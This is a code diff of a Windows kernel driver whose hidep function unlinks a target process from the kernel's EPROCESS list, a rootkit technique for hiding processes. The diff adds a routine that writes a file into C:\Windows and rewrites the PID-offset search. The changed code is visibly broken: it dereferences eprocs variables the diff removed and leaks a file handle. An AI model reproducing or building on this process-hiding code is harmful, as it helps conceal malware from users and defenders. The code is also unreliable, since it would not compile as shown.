@@ -13,6 +13,7 @@ PCHAR hidep(UINT32 pid) {
 	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
 	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
 	
+	
 
 	// Record the starting position
 	PEPROCESS StartProcess = currentProcess;
@@ -23,6 +24,9 @@ PCHAR hidep(UINT32 pid) {
 	currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
 
 
+
+
+
 	// Loop until we find the right process to remove
 	// Or until we circle back
 	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentProcess) {
@@ -30,6 +34,8 @@ PCHAR hidep(UINT32 pid) {
 		// Check item
 		if (*(UINT32*)CurrentPID == pid) {
 		
+			
+
 			PLIST_ENTRY prev = currentList->Blink;
 			PLIST_ENTRY next = currentList->Flink;
 
@@ -49,37 +55,75 @@ PCHAR hidep(UINT32 pid) {
 		currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
 	}
 
+
+	
+
 	return NULL;
 }
 
+void debugFile(WCHAR name[]) {
+
+	// START
+	NTSTATUS ntstatus = STATUS_SUCCESS;
+	/////////////////////// THIS SECTION /////////////////////////////////////
+	UNICODE_STRING     uniName;
+	OBJECT_ATTRIBUTES  objAttr;
+	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
+	RtlInitUnicodeString(&uniName, name);  // or L"\\SystemRoot\\example.txt"
+	InitializeObjectAttributes(&objAttr, &uniName,
+		OBJ_CASE_INSENSITIVE,
+		NULL, NULL);
+	//////////////////////////////////
+
+	///////////////////////////////////
+	// Load the buffer (ie. contents of text file to the console)
+	HANDLE handle;
+	IO_STATUS_BLOCK    ioStatusBlock;
+	ntstatus = ZwCreateFile(&handle,
+		FILE_WRITE_DATA,
+		&objAttr, &ioStatusBlock,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		0,
+		FILE_OPEN_IF,
+		FILE_NON_DIRECTORY_FILE,
+		NULL, 0);
+
+}
 
 
 ULONG find_eproc_pid() {
 
 	ULONG pid_ofs = 0;					// The offset we're looking for
 	int idx = 0;						// Index 
-	ULONG pids[PROCAMOUNT] = { 0 };		// List of PIDs for our 3 processes
-	PEPROCESS eprocs[PROCAMOUNT];		// Process list, will contain 3 processes
+	ULONG pid = 0;		
+	PEPROCESS eproc;
 
 	// Select 3 process PIDs and get their EPROCESS Pointer
-	for (int i = 16; idx < PROCAMOUNT; i += 4) {
-		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx]))) {
-			pids[idx++] = i;
+	for (int i = 16;; i += 4) {
+
+		if (PsLookupProcessByProcessId((HANDLE)i, &eproc) == STATUS_SUCCESS) {
+			pid = i;
+			break;
 		}
 	}
 
 	for (int i = 0x20; i < 0x300; i += 4) {
-		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
-			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
-			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
+		if ((*(ULONG*)((UCHAR*)eproc + i) == pid))
 		{
+			debugFile(L"\\DosDevices\\C:\\Windows\\here.txt");
 			pid_ofs = i; break;
 		}
 	}
 
+	
+
+
 	ObDereferenceObject(eprocs[0]);
 	ObDereferenceObject(eprocs[1]);
 	ObDereferenceObject(eprocs[2]);
+
+
 
 
 	return pid_ofs;
